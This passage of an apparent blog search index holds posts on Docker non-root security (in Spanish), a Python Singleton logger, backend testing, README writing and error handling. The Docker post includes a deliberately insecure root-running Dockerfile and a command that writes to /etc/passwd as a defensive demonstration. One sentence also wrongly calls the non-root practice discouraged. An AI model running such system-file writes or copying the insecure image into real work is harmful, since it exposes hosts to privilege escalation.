seguridad.</p> <p>Ejecutar contenedores de Docker con privilegios de usuario root puede plantear riesgos de seguridad por varias razones:</p> <ol> <li>Escalada de privilegios: Ejecutar contenedores como usuario root puede proporcionar una v\u00eda para la elevaci\u00f3n de privilegios. Si un atacante puede explotar una vulnerabilidad dentro del contenedor, podr\u00eda lograr la escalada de sus privilegios y tomar el control del sistema subyacente del host.</li> <li>Aumento de la superficie de ataque: Permitir que un contenedor de Docker se ejecute como usuario root aumenta la superficie de ataque potencial. Si un atacante obtiene el control de un contenedor con privilegios de root , puede tener m\u00e1s opciones para explotar vulnerabilidades y comprometer el sistema host.</li> <li>Acceso al sistema de archivos: El acceso root dentro de un contenedor significa acceso irrestricto al sistema de archivos. Esto podr\u00eda llevar a modificaciones o eliminaciones no deseadas de archivos cr\u00edticos del sistema, potencialmente causando inestabilidad del sistema o p\u00e9rdida de datos.</li> <li>Aislamiento de espacio de nombres de usuario: Los contenedores de Docker aprovechan los espacios de nombres de usuarios para proporcionar cierto nivel de aislamiento entre los usuarios del contenedor y del sistema host. Ejecutar contenedores como un usuario non-root garantiza que, incluso si un atacante obtiene acceso al contenedor, no tendr\u00e1 autom\u00e1ticamente acceso de root en el host.</li> <li>Mejores pr\u00e1cticas de seguridad: Seguir las mejores pr\u00e1cticas de seguridad es esencial para minimizar posibles vulnerabilidades. Ejecutar contenedores con el menor privilegio necesario es un principio fundamental en la seguridad de contenedores. Al utilizar un usuario non-root , se adhiere al principio de menor privilegio, limitando el impacto potencial de violaciones de seguridad.</li> </ol> <p>Utilizar un usuario non-root en Docker es implementar el principio de menor privilegio delineado en las pautas de Control de Acceso de OWASP. Esta pr\u00e1ctica est\u00e1 desaconsejada, como se destaca tanto en las Hojas de Seguridad de OWASP Docker, espec\u00edficamente en la regla n.\u00ba 2 \u201cestablecer un usuario\u201d, como en el CIS Docker Benchmark V1.6.0 bajo \u201c4.1 \u2014 Asegurarse de que se haya creado un usuario para el contenedor (Manual)\u201d. Seguir estas pautas mejora la seguridad del contenedor al limitar permisos innecesarios y reducir la posibilidad de problemas de seguridad.</p> <p>Con un usuario non-root en un Dockerfile, incluye la instrucci\u00f3n \u201cUSER\u201d, como \u201cUSER myuser\u201d, para cambiar a una identidad menos privilegiada. Sin ella, el valor predeterminado es ejecutarse como root. En un comando \u201cdocker run\u201d, especificar un usuario implica el uso de la bandera \u201c-u\u201d, por ejemplo, \u201cdocker run -u 1000\u201d, donde 1000 es el ID de usuario. Estos fragmentos de c\u00f3digo ilustran c\u00f3mo establecer y gestionar los permisos de usuario dentro de una imagen de Docker, promoviendo la seguridad al minimizar el uso de privilegios elevados.</p> <p>Test Negativo:</p> <pre><code># Example Negative\n\n# Uses Ubuntu as a parent image  \nFROM ubuntu:22.04\n\n# Create a non-root user and switch to it  \nRUN useradd -m myuser  \nUSER myuser\n\n# When the container launches, bash shell also launches  \nCMD [\"/bin/bash\"]`\n</code></pre> <p>Test Positivo:</p> <pre><code>#Example Positive\n\n# Uses Ubuntu as a parent image  \nFROM ubuntu:22.04\n\n# When the container launches, bash shell also launches  \nCMD [\"/bin/bash\"]\n</code></pre>"},{"location":"blog/old-blogs/2024-01-04_Asegurando-Docker--Mejores-Pr-cticas-para-Usuarios-Non-Root-aafb40f7766b/#demostracion-de-obtener-acceso-non-root-en-un-dockerfile","title":"Demostraci\u00f3n de obtener acceso non-root en un Dockerfile:","text":"<p>Esta demostraci\u00f3n viola los principios de Elevaci\u00f3n de Privilegios, Acceso al Sistema de Archivos y las Mejores Pr\u00e1cticas de Seguridad.</p>"},{"location":"blog/old-blogs/2024-01-04_Asegurando-Docker--Mejores-Pr-cticas-para-Usuarios-Non-Root-aafb40f7766b/#que-es-el-archivo-passwd","title":"\u00bfQu\u00e9 es el archivo passwd?","text":"<p>El archivo <code>/etc/passwd</code> dentro de un contenedor de Docker es un archivo de sistema est\u00e1ndar que almacena informaci\u00f3n de cuentas de usuario. Se utiliza com\u00fanmente en sistemas operativos tipo Unix, incluyendo Linux. Cada l\u00ednea en el archivo representa una cuenta de usuario y contiene varias piezas de informaci\u00f3n acerca de ese usuario.</p> <p>El formato t\u00edpico de una l\u00ednea en el archivo <code>/etc/passwd</code> es el siguiente:</p> <p><code>username:password:userID:groupID:userInfo:homeDirectory:loginShell</code></p> <p>Aqu\u00ed un desglose de los campos:</p> <p><code>**username:** El nombre del usuario.   **password:** Generalmente representado por \u2018x\u2019, indicando que la contrase\u00f1a cifrada real se almacena en el archivo /etc/shadow u otro lugar seguro.   **userID (UID):** Un identificador num\u00e9rico \u00fanico para el usuario.   **groupID (GID):** El identificador num\u00e9rico del grupo principal del usuario.   **userInfo:** Informaci\u00f3n adicional sobre el usuario (a menudo, el nombre completo).   **homeDirectory:** El directorio principal del usuario, donde com\u00fanmente inicia sesi\u00f3n.   **loginShell:** La shell predeterminada del usuario.</code></p>"},{"location":"blog/old-blogs/2024-01-04_Asegurando-Docker--Mejores-Pr-cticas-para-Usuarios-Non-Root-aafb40f7766b/#por-que-demostrar-un-exploit-inseguro","title":"\u00bfPor qu\u00e9 demostrar un exploit inseguro?","text":"<p>En un sistema t\u00edpico tipo Unix, incluido Linux, el archivo <code>/etc/passwd</code> se utiliza para almacenar informaci\u00f3n de cuentas de usuario y tradicionalmente tiene permisos de lectura para todos los usuarios. Los permisos pueden parecer as\u00ed:</p> <p><code>-rw-r \u2014 r \u2014 1 root root 1153 Dec 8 12:34 /etc/passwd</code></p> <p>Aqu\u00ed, el archivo es legible por todos, pero solo modificable por el usuario root. Si un usuario non-root tiene la capacidad de escribir en el archivo <code>/etc/passwd</code>, esto puede potencialmente llevar a vulnerabilidades y riesgos de seguridad. Aqu\u00ed hay algunas razones:</p> <ol> <li>Elevaci\u00f3n de Privilegios del Usuario: Si un usuario non-root puede escribir en el archivo <code>/etc/passwd</code>, podr\u00eda manipular las entradas en \u00e9l. Esto podr\u00eda incluir la modificaci\u00f3n del UID (Identificaci\u00f3n de Usuario) o GID (Identificaci\u00f3n de Grupo) de usuarios existentes, permitiendo potencialmente al usuario non-root escalar sus privilegios.</li> <li>Suplantaci\u00f3n de Identidad de Usuario: Al modificar el archivo <code>/etc/passwd</code>, un usuario non-root podr\u00eda intentar suplantar a otros usuarios o obtener acceso no autorizado a recursos asociados con esos usuarios. Esto podr\u00eda provocar violaciones de seguridad y acceso no autorizado.</li> <li>Integridad del Sistema: El archivo <code>/etc/passwd</code> es crucial para el funcionamiento adecuado del sistema. Si sus contenidos se manipulan, podr\u00eda causar inestabilidad del sistema, errores o interrupciones en la autenticaci\u00f3n de usuarios.</li> <li>Escape del Contenedor: Si esta manipulaci\u00f3n ocurre dentro de un entorno contenerizado, podr\u00eda utilizarse como parte de un ataque m\u00e1s amplio para escapar del contenedor y obtener acceso no autorizado al sistema principal.</li> </ol>"},{"location":"blog/old-blogs/2024-01-04_Asegurando-Docker--Mejores-Pr-cticas-para-Usuarios-Non-Root-aafb40f7766b/#demostracion","title":"Demostraci\u00f3n","text":"<p>Ejecut\u00e9 el comando docker build en las pruebas anteriores del Dockerfile, tanto las positivas como las negativas (que aparecen arriba), seguido del comando docker run. En la prueba positiva, donde el Dockerfile carec\u00eda de un campo \u201cUSER\u201d, utilic\u00e9 el comando <code>echo \u201ctest\u201d &gt;&gt; /etc/passwd</code> para ilustrar el acceso al comando. Por otro lado, en la prueba negativa con el campo \u201cUSER\u201d, demostr\u00e9 la prevenci\u00f3n de obtener control de usuario root.</p> <p>Test NegativoTest Positivo</p>"},{"location":"blog/old-blogs/2024-01-04_Asegurando-Docker--Mejores-Pr-cticas-para-Usuarios-Non-Root-aafb40f7766b/#conclusion","title":"Conclusi\u00f3n","text":"<p>En conclusi\u00f3n, Docker ha transformado por completo el panorama de la implementaci\u00f3n de aplicaciones a trav\u00e9s de su innovadora plataforma de contenerizaci\u00f3n. Proporciona a los desarrolladores contenedores \u00e1giles y port\u00e1tiles, simplificando los flujos de trabajo de desarrollo. La amplia adopci\u00f3n de Docker se atribuye a su interfaz f\u00e1cil de usar, compatibilidad en diversas plataformas y la utilizaci\u00f3n eficiente de recursos. Sin embargo, a medida que evoluciona la tecnolog\u00eda de contenerizaci\u00f3n, introduce desaf\u00edos de seguridad, especialmente en la gesti\u00f3n de vulnerabilidades.</p> <p>Para abordar estos problemas, es crucial seguir las mejores pr\u00e1cticas y directrices de OWASP y el CIS Docker Benchmark. Evitar otorgar privilegios de usuario root en los contenedores de Docker es un paso de seguridad importante, como se muestra al manipular el archivo <code>/etc/passwd</code>, lo que expone riesgos potenciales en la gesti\u00f3n de la informaci\u00f3n de cuentas de usuarios. Asegurar entornos de Docker depende de gestionar adecuadamente a los usuarios, resaltando la importancia de utilizar usuarios non-root en los Dockerfiles y configuraciones en tiempo de ejecuci\u00f3n.</p> <p>Como desarrolladores, incorporar estas pr\u00e1cticas es fundamental para mitigar riesgos de seguridad y asegurar el establecimiento de un entorno de implementaci\u00f3n s\u00f3lido y seguro.</p>"},{"location":"blog/old-blogs/2024-01-04_Asegurando-Docker--Mejores-Pr-cticas-para-Usuarios-Non-Root-aafb40f7766b/#referencias","title":"Referencias","text":"<p>https://www.docker.com/blog/docker-index-dramatic-growth-in-docker-usage-affirms-the-continued-rising-power-of-developers/</p> <p>https://www.docker.com/blog/container-security-and-why-it-matters/</p> <p>https://linuxize.com/post/etc-passwd-file/</p> <p>https://owasp.org/www-community/Access_Control</p> <p>https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html#rule-2-set-a-user</p> <p>https://www.cisecurity.org/insights/blog/announcing-cis-benchmark-for-docker-1-6</p> <p>https://docs.docker.com/engine/reference/builder/#user</p> <p>By Kfir Gisman on January 4, 2024.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2024-04-15_Solving-Logs-Woes--A-Dive-into-Singleton-Design-Pattern-1f77e70bd498/","title":"Solving Logs Woes: A Dive into Singleton Design Pattern","text":"<p>The article explores solving logging issues in Python by leveraging the Singleton Design Pattern, ensuring centralized logging. </p>"},{"location":"blog/old-blogs/2024-04-15_Solving-Logs-Woes--A-Dive-into-Singleton-Design-Pattern-1f77e70bd498/#solving-logs-woes-a-small-dive-into-singleton-design-pattern","title":"Solving Logs Woes: A Small Dive into Singleton Design Pattern","text":"<p> Credit: Saydung89</p> <p>Recently, I\u2019ve been working on a new feature for a Python software project. To make sure it\u2019s solid, I thought it\u2019d be a good idea to add logs using the \u201clogging\u201d Python package. It\u2019s been really helpful because I can see what\u2019s happening at every step of my program right in the console. It\u2019s made tracking down bugs a lot easier.</p> <p>Initially, I thought incorporating logging would be straightforward \u2014 simply import the library and start logs. However, I hit a roadblock when I couldn\u2019t get it to write logs from files. Despite trying various solutions like checking the logging configuration file and creating new instances or modules, none of them worked. Then, a colleague suggested a solution I had overlooked: the Singleton Design Pattern. This approach turned out to be the key to solving my problem. Now, I\u2019ll explain what it is and how to implement it, so you\u2019ll feel confident using it in the future if similar issues arise.</p>"},{"location":"blog/old-blogs/2024-04-15_Solving-Logs-Woes--A-Dive-into-Singleton-Design-Pattern-1f77e70bd498/#what-is-singleton-design-approach","title":"What Is Singleton Design Approach","text":"<p>The Singleton design pattern is a simple yet powerful concept often used in software development. Imagine you have a class (let\u2019s call it Logger) and you want only one instance of this class to exist throughout your program\u2019s execution.</p> <p>In simpler terms, think of the Singleton as a guardian that ensures there\u2019s only one instance of a particular class. It\u2019s like having a single key to a treasure chest \u2014 no matter how many times you ask for the key, you\u2019ll always get the same one.</p>"},{"location":"blog/old-blogs/2024-04-15_Solving-Logs-Woes--A-Dive-into-Singleton-Design-Pattern-1f77e70bd498/#heres-a-breakdown","title":"Here\u2019s a breakdown:","text":"<ul> <li>One and Only One : The Singleton ensures that there\u2019s only one instance of a class. It\u2019s like having a single instance of your favorite game running \u2014 you can\u2019t open two instances of the same game simultaneously.</li> <li>Global Access: Once the Singleton is created, it provides a global point of access to that instance. Just like a lighthouse guiding ships in the night, the Singleton guides your program to the same instance every time you need it.</li> <li>Common Use Cases: Singletons are handy for resources that should be shared across the entire application, such as a database connection, a logger, or a configuration manager.</li> <li>Implementation: Typically, Singletons are implemented using a static method (like <code>getInstance()</code>) that either creates a new instance if none exists or returns the existing instance if it does.</li> </ul> <p>Here\u2019s a simple example in Python:</p> <pre><code> class Singleton:  \n _instance = None\n\n @staticmethod  \n def getInstance():  \n     if Singleton._instance is None:  \n         Singleton._instance = Singleton()  \n     return Singleton._instance\n\n# Usage:  \nsingleton_instance1 = Singleton.getInstance()  \nsingleton_instance2 = Singleton.getInstance()\n\nprint(singleton_instance1 == singleton_instance2)  # Output: True\n</code></pre> <ul> <li>Benefits: Singletons help conserve resources by ensuring that only one instance of a class exists. They also simplify global state management by providing a centralized point of access.</li> <li>Caveats: While Singletons are useful, they can sometimes be overused, leading to tight coupling and global state-related issues. It\u2019s essential to use them judiciously and consider other alternatives when appropriate.</li> </ul>"},{"location":"blog/old-blogs/2024-04-15_Solving-Logs-Woes--A-Dive-into-Singleton-Design-Pattern-1f77e70bd498/#how-singleton-design-resolved-my-issue","title":"How Singleton Design Resolved My Issue","text":"<p>Now, let\u2019s delve into how I utilized the Singleton pattern to address my issue in the code:</p> <pre><code>class Logger:  \n _instance = None\n\n def __new__(cls):  \n     if cls._instance is None:  \n         cls._instance = super().__new__(cls)  \n         cls._instance.setup_logger()  \n     return cls._instance\n\n def setup_logger(self):  \n     # logging configuration here\n</code></pre> <ol> <li><code>_instance</code>Attribute: This attribute keeps track of the single instance of the <code>Logger</code> class.</li> <li><code>__new__</code>Method: Python\u2019s special <code>__new__</code> method is harnessed here to manage object instantiation. If <code>_instance</code> is <code>None</code>, indicating no instance exists, a new one is created via <code>super().__new__(cls)</code>and <code>setup_logger()</code> is invoked to configure the logger. Subsequent calls to <code>__new__</code> will return the same instance stored in <code>_instance</code>.</li> <li><code>setup_logger</code>Method: Responsible for configuring the logger. It\u2019s executed only once during the creation of the singleton instance.</li> </ol>"},{"location":"blog/old-blogs/2024-04-15_Solving-Logs-Woes--A-Dive-into-Singleton-Design-Pattern-1f77e70bd498/#how-it-functions","title":"How It Functions:","text":"<ul> <li>Whenever you create an instance of <code>Logger (logger_root = Logger())</code>, <code>__new__</code> kicks in.</li> <li>If <code>_instance</code> is <code>None</code>, implying no instance exists, a fresh one is created and stored in <code>_instance</code>.</li> <li>Subsequent calls to <code>Logger()</code> return the same instance stored in <code>_instance</code>, ensuring the singular existence of the <code>Logger</code> class across your program.</li> </ul>"},{"location":"blog/old-blogs/2024-04-15_Solving-Logs-Woes--A-Dive-into-Singleton-Design-Pattern-1f77e70bd498/#pros-and-considerations","title":"Pros and Considerations:","text":"<ul> <li>Universal Access: Access the logger instance globally via <code>logger_root</code>.</li> <li>Thread Safety: This implementation doesn\u2019t address thread safety. For multithreaded applications, consider synchronizing access to the singleton instance.</li> <li>Lazy Initialization: The logger instance is lazily instantiated, meaning it\u2019s created only when first requested. This conserves resources if the logger isn\u2019t always in use.</li> </ul>"},{"location":"blog/old-blogs/2024-04-15_Solving-Logs-Woes--A-Dive-into-Singleton-Design-Pattern-1f77e70bd498/#double-checking","title":"Double Checking","text":"<p>I won\u2019t delve too deeply into the double-checking pattern that I integrated into my <code>__new__</code> function. Essentially, I added double-checking within the <code>__new__</code> method by first checking if the <code>_instance</code> is <code>None</code>, then acquiring a lock to ensure thread safety, and finally rechecking if <code>_instance</code> is still <code>None</code> before creating a new instance. If you\u2019re interested in learning more about it, you can check out this link: ( https://www.geeksforgeeks.org/java-program-to-demonstrate-the-double-check-locking-for-singleton-class/ )</p>"},{"location":"blog/old-blogs/2024-04-15_Solving-Logs-Woes--A-Dive-into-Singleton-Design-Pattern-1f77e70bd498/#conclusion","title":"Conclusion","text":"<p>By integrating the Singleton pattern, you ensure a streamlined, centralized logging mechanism within your project.</p>"},{"location":"blog/old-blogs/2024-04-15_Solving-Logs-Woes--A-Dive-into-Singleton-Design-Pattern-1f77e70bd498/#references","title":"References","text":"<p>Singleton Design Pattern In this article, we will talk about what is Singleton Design Pattern and when we need it. Further, we will implement\u2026 medium.com</p> <p>Introduction to Design Patterns &amp; Understanding Singleton Design Pattern If you are a software engineer, understanding design patterns and working with those will make you an exceptional\u2026 medium.com</p> <p>Singleton Singleton is a creational design pattern that lets you ensure that a class has only one instance, while providing a\u2026 refactoring.guru</p> <p>Singleton Pattern in Python - A Complete Guide - GeeksforGeeks A Computer Science portal for geeks. It contains well written, well thought and well explained computer science and\u2026 www.geeksforgeeks.org</p> <p>logging - Logging facility for Python Source code: Lib/logging/init.py Important: This page contains the API reference information. For tutorial\u2026 docs.python.org</p>"},{"location":"blog/old-blogs/2024-04-15_Solving-Logs-Woes--A-Dive-into-Singleton-Design-Pattern-1f77e70bd498/#in-plain-english","title":"In Plain English \ud83d\ude80","text":"<p>Thank you for being a part of the** In Plain English** community! Before you go:</p> <ul> <li>Be sure to clap and follow the writer \ufe0f\ud83d\udc4f\ufe0f\ufe0f</li> <li>Follow us: X|LinkedIn|YouTube|Discord|Newsletter</li> <li>Visit our other platforms: Stackademic|CoFeed|Venture|Cubed</li> <li>More content at PlainEnglish.io</li> </ul> <p>By Kfir Gisman on April 15, 2024.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2024-05-22_Enhancing-Software-Architecture-through-Comprehensive-Testing-in-Backend-Development-26555424f7a0/","title":"Enhancing Software Architecture through Comprehensive Testing in Backend Development","text":"<p>In a recent project, I was tasked with delivering a crucial backend component with robust functionality as well as requiring comprehensive\u2026 </p>"},{"location":"blog/old-blogs/2024-05-22_Enhancing-Software-Architecture-through-Comprehensive-Testing-in-Backend-Development-26555424f7a0/#enhancing-software-architecture-through-comprehensive-testing-in-backend-development_1","title":"Enhancing Software Architecture through Comprehensive Testing in Backend Development","text":"<p>In a recent project, I was tasked with delivering a crucial backend component with robust functionality as well as requiring comprehensive testing. Initially, I perceived testing as a responsibility of the QA or automation team rather than mine as a Software Engineer; however, I soon realized that incorporating that testing into my development process was pivotal for ensuring code quality and resilience.</p> <p>This article aims to provide insights into my approach towards testing as a backend engineer. By focusing on the mindsets and architectural strategies that empower developers to craft thorough testing, you can instil confidence in their codebase.</p>"},{"location":"blog/old-blogs/2024-05-22_Enhancing-Software-Architecture-through-Comprehensive-Testing-in-Backend-Development-26555424f7a0/#understanding-backend-component-architecture","title":"Understanding Backend Component Architecture","text":"<p>At the core of backend development lies the objective of processing inputs, executing calculations, and producing an output. For instance, consider a scenario where an API endpoint receives a pizza order with specified toppings, calculates the total bill based on the various parameters, and returns the result to the client; this exemplifies a basic workflow within a backend component.</p>"},{"location":"blog/old-blogs/2024-05-22_Enhancing-Software-Architecture-through-Comprehensive-Testing-in-Backend-Development-26555424f7a0/#layered-structure-controller-service-and-data-access","title":"Layered Structure: Controller, Service, and Data Access","text":"<p>To organize the backend component effectively, I adopt a three-layered architecture:</p> <ol> <li>Controller Layer: Utilizing Express, this layer handles incoming requests and delegates tasks to service methods. Controllers define endpoints and facilitate communication with the service layer which helps keep routes concise and focused.</li> <li>Service Layer: Comprised of classes responsible for business logic, the service layer interacts with data models and orchestrates various operations. Importantly, service methods do not directly interact with request or response objects, ensuring separation of concerns and promoting modularity.</li> <li>Data Access Layer: Represented by data models implemented with frameworks like Objection, this layer facilitates interaction with the database. It encapsulates functionalities related to data retrieval, manipulation, and validation which maintains the integrity of data operations.</li> </ol>"},{"location":"blog/old-blogs/2024-05-22_Enhancing-Software-Architecture-through-Comprehensive-Testing-in-Backend-Development-26555424f7a0/#building-comprehensive-tests","title":"Building Comprehensive Tests","text":"<p>The primary goal of testing is to validate the functionality of each component and ensure that it behaves as expected under different scenarios. I categorize tests into True Positive (TP), False Positive (FP), and error scenarios to cover a wide range of use cases and edge conditions of function tests.</p> <p></p> <p>For every function within each layer, I develop three types of tests:</p> <ol> <li>True Positive (TP): This evaluates the function\u2019s correct behavior under valid input conditions. In the scenario of the pizza ordering system, a TP test would ensure that when a valid pizza order with all required toppings is submitted, the system would calculate the total cost accurately and return the expected result.</li> <li>False Positive (FP): This is used to identify potential issues or unexpected behavior when an invalid input is provided. Continuing the pizza ordering example, an FP test might involve submitting an order with an invalid topping combination or missing required information. This test ensures that the system appropriately handles such scenarios and then perhaps rejects the order or provides an error message.</li> <li>Error Handling: Testing various error scenarios, such as file not found or database connection errors, verifies the robustness of error handling mechanisms. In the pizza ordering system, an error handling test could simulate a situation where the database containing topping information is temporarily unavailable. This test ensures that the system gracefully handles the error, perhaps by displaying a user-friendly message or retrying the operation after a brief delay.</li> </ol> <p>Additionally, unit tests should be conducted to verify the behavior of individual input and output fields to ensure data consistency and accuracy. For example, unit tests for the pizza ordering system might validate that the price calculation function accurately computes the total cost based on the selected toppings and any applicable discounts.</p>"},{"location":"blog/old-blogs/2024-05-22_Enhancing-Software-Architecture-through-Comprehensive-Testing-in-Backend-Development-26555424f7a0/#conclusion","title":"Conclusion","text":"<p>By integrating comprehensive function testing practices into the software design architecture, developers can fortify their components against bugs and uncertainties, fostering confidence in the codebase. Embracing this approach not only improves code quality but can also enable a smoother development process.</p> <p>Happy coding!</p> <p></p>"},{"location":"blog/old-blogs/2024-05-22_Enhancing-Software-Architecture-through-Comprehensive-Testing-in-Backend-Development-26555424f7a0/#in-plain-english","title":"In Plain English \ud83d\ude80","text":"<p>Thank you for being a part of the** In Plain English** community! Before you go:</p> <ul> <li>Be sure to clap and follow the writer \ufe0f\ud83d\udc4f\ufe0f\ufe0f</li> <li>Follow us: X|LinkedIn|YouTube|Discord|Newsletter</li> <li>Visit our other platforms: Stackademic|CoFeed|Venture|Cubed</li> <li>Tired of blogging platforms that force you to deal with algorithmic content? Try Differ</li> <li>More content at PlainEnglish.io</li> </ul> <p>By Kfir Gisman on May 22, 2024.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2024-06-19_How-to-Write-an-Effective-README-File---A-Guide-for-Software-Engineers-09a9618c0532/","title":"How to Write an Effective README File \u2014 A Guide for Software Engineers","text":"<p>Master the art of writing READMEs! Learn structure, content, and styling to make your project shine </p>"},{"location":"blog/old-blogs/2024-06-19_How-to-Write-an-Effective-README-File---A-Guide-for-Software-Engineers-09a9618c0532/#how-to-write-an-effective-readme-file-a-guide-for-software-engineers_1","title":"How to Write an Effective README File -A Guide for Software Engineers","text":"<p>Photo by Guy Hurst</p> <p>As software engineers, our goal is to create code that remains relevant and maintainable over the years. A key element in achieving this is crafting a comprehensive and clear README file. A README file is vital for effectively documenting and summarizing your work. This blog post shares my perspective on the importance of README files, specifically for internal use rather than open-source repositories, which already have numerous established guidelines.</p> <p></p>"},{"location":"blog/old-blogs/2024-06-19_How-to-Write-an-Effective-README-File---A-Guide-for-Software-Engineers-09a9618c0532/#the-importance-of-a-readme-file","title":"The Importance of a README File","text":"<p>A well-crafted README file offers numerous benefits that enhance the development process and overall project management. Here are some key reasons why a relevant README file is indispensable:</p> <ol> <li>Facilitates Collaboration: A comprehensive README file allows other software engineers to quickly understand the project and contribute effectively. By providing clear instructions and context, it reduces the learning curve for new contributors and ensures consistency in coding practices.</li> <li>Improves Interdepartmental Communication: Other departments, such as QA, marketing, or customer support, can find answers to their questions within the README file, eliminating the need for direct communication with the development team. This streamlines workflows and minimizes interruptions.</li> <li>Saves Time: By centralizing critical information about the project, a README file saves time for everyone involved. Team members can refer to it for guidance on setup, usage, and troubleshooting, reducing the need for repeated explanations and individual support.</li> <li>Organizes Your Thoughts: Writing a README file forces you to organize your thoughts and clarify the project\u2019s objectives, structure, and implementation details. This process can reveal gaps in your planning and help refine your approach.</li> <li>Highlights Key Aspects of the Code: The README file gives you the opportunity to highlight important aspects of the code, such as unique features, architectural decisions, and areas that may require special attention. This not only aids understanding but also helps in maintaining and scaling the project in the future.</li> </ol> <p>In essence, a relevant README file acts as a cornerstone for effective project documentation, fostering better communication, efficiency, and collaboration across all levels of a software development project.</p>"},{"location":"blog/old-blogs/2024-06-19_How-to-Write-an-Effective-README-File---A-Guide-for-Software-Engineers-09a9618c0532/#key-points-to-address-in-a-readme-file","title":"Key Points to Address in a README File","text":"<p>To create a high-quality README file, ensure you cover these major aspects:</p> <ol> <li>What the Code Component Does: Clearly describe the purpose of the code component, including the inputs it requires, the main algorithms or calculations it performs, and the expected outputs. This section should give readers a solid understanding of the component\u2019s functionality and how it fits into the larger project.</li> <li>How to Run the Code: Provide detailed instructions on how to set up and run the code. Include necessary installation steps, dependencies, package requirements, and any environment variables that need to be configured. This ensures that anyone trying to use the code can do so with minimal friction.</li> <li>Why It Does Things the Way It Does (Optional): If relevant, explain the reasoning behind specific implementation choices. This might include why certain algorithms were chosen, the rationale for architectural decisions, or any trade-offs that were made. While optional, this context can be invaluable for future developers who may need to modify or extend the code.</li> </ol> <p>By addressing these key points, you ensure that your README file is not only informative but also practical and user-friendly, making it easier for others to understand, use, and contribute to your project.</p>"},{"location":"blog/old-blogs/2024-06-19_How-to-Write-an-Effective-README-File---A-Guide-for-Software-Engineers-09a9618c0532/#essential-elements-of-a-readme-file","title":"Essential Elements of a README File","text":"<p>A well-structured README file should cover several key points to provide a comprehensive guide for users and contributors. These include:</p> <ol> <li>Table of Contents: (optional) A clear table of contents helps readers quickly navigate through the README file to find the information they need.</li> <li>How to Install: Provide step-by-step installation instructions, detailing the necessary tools, packages, and dependencies required to set up the project.</li> <li>How to Run It: Explain how to execute the code, including any required commands, configurations, or environment setups.</li> <li>Main Workflow: Describe the primary workflow of the project, highlighting how different components interact and the overall process flow.</li> <li>How to Add Code / Contribute: Offer guidelines for contributing to the project, including coding standards, branch management, and the process for submitting pull requests.</li> <li>What It Does: Summarize the purpose and functionality of the project, making it clear what problems it solves and the main features it offers.</li> <li>How to Test It: Provide instructions for testing the code, including any testing frameworks or tools used, as well as how to run tests and interpret the results.</li> <li>Dependencies: Provide a list of all external libraries, tools, and frameworks the project relies on, including their versions and installation instructions. Include a link to the <code>requirements.txt</code> file for easy access to the required dependencies.</li> <li>Security: Address any security considerations, such as authentication, data encryption, and how to report security vulnerabilities.</li> <li>Scalability: Discuss the scalability of the project, including how it can handle increased load, potential bottlenecks, and recommendations for scaling the infrastructure.</li> </ol> <p>By including these key points, your README file will serve as a valuable resource for understanding, using, and contributing to the project, ensuring clarity and ease of use for all stakeholders.</p>"},{"location":"blog/old-blogs/2024-06-19_How-to-Write-an-Effective-README-File---A-Guide-for-Software-Engineers-09a9618c0532/#writing-style-for-a-readme-file","title":"Writing Style for a README File","text":"<p>The README file should be crafted in a manner that is simple, concise, and coherent. Strive to use clear and concise language to convey information effectively without overwhelming the reader. Ensure that the content aligns with general terminology and industry standards, making it easier for others to understand and follow. This approach helps maintain readability and accessibility, ensuring that the README file is useful for both current team members and future contributors.</p>"},{"location":"blog/old-blogs/2024-06-19_How-to-Write-an-Effective-README-File---A-Guide-for-Software-Engineers-09a9618c0532/#conclusion","title":"Conclusion","text":"<p>In conclusion, the README file is more than just a document; it\u2019s a roadmap that guides every stakeholder through the intricacies of a software project. It serves as a beacon for collaboration, a time-saver for team members, and a bridge between departments. By meticulously documenting the purpose, setup, and operation of the code, a README file crystallizes the essence of the project, ensuring that its legacy can be understood and built upon for years to come. Whether for internal use or a wider audience, the README file stands as a testament to the thoughtful engineering and clear communication that underpin successful software development. Remember, a well-maintained README is not just for today \u2014 it\u2019s for the sustainability and adaptability of your code in the ever-evolving landscape of technology.</p>"},{"location":"blog/old-blogs/2024-06-19_How-to-Write-an-Effective-README-File---A-Guide-for-Software-Engineers-09a9618c0532/#stackademic","title":"Stackademic \ud83c\udf93","text":"<p>Thank you for reading until the end. Before you go:</p> <ul> <li>Please consider clapping and following the writer! \ud83d\udc4f</li> <li>Follow us X | LinkedIn | YouTube | Discord</li> <li>Visit our other platforms: In Plain English | CoFeed | Differ</li> <li>More content at Stackademic.com</li> </ul> <p>By Kfir Gisman on June 19, 2024.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2024-08-12_Mastering-Error-Handling--A-Comprehensive-Guide-9db00b203f15/","title":"Mastering Error Handling: A Comprehensive Guide","text":"<p>Understanding Error Handling </p>"},{"location":"blog/old-blogs/2024-08-12_Mastering-Error-Handling--A-Comprehensive-Guide-9db00b203f15/#mastering-error-handling-a-comprehensive-guide_1","title":"Mastering Error Handling: A Comprehensive Guide","text":""},{"location":"blog/old-blogs/2024-08-12_Mastering-Error-Handling--A-Comprehensive-Guide-9db00b203f15/#understanding-error-handling","title":"Understanding Error Handling","text":""},{"location":"blog/old-blogs/2024-08-12_Mastering-Error-Handling--A-Comprehensive-Guide-9db00b203f15/#what-is-error-handling","title":"What is Error Handling?","text":"<p>Error handling is the process of anticipating, detecting, and responding to unexpected situations or anomalies that occur during the execution of a software application. It involves designing strategies to gracefully manage these errors, preventing system crashes, and providing informative feedback to both the system and the user.</p>"},{"location":"blog/old-blogs/2024-08-12_Mastering-Error-Handling--A-Comprehensive-Guide-9db00b203f15/#why-is-error-handling-important","title":"Why is Error Handling Important?","text":"<p>Error handling is crucial for several reasons:</p> <ul> <li>Preventing application crashes: Robust error handling ensures that an application continues to operate even when unexpected issues arise, avoiding abrupt termination.</li> <li>Providing informative feedback to users: Clear and helpful error messages guide users in understanding and resolving problems.</li> <li>Protecting data integrity: Proper error handling safeguards data from corruption or loss by implementing mechanisms to recover from errors.</li> <li>Improving application reliability and maintainability: Well-structured error handling makes applications more resilient and easier to debug and modify.</li> <li>Enhancing user experience: By gracefully handling errors, applications provide a smoother user experience, reducing frustration and increasing satisfaction.</li> </ul>"},{"location":"blog/old-blogs/2024-08-12_Mastering-Error-Handling--A-Comprehensive-Guide-9db00b203f15/#types-of-errors","title":"Types of Errors","text":"<p>Errors can be categorized into:</p> <ul> <li>Syntax errors: These occur due to violations of programming language rules, such as 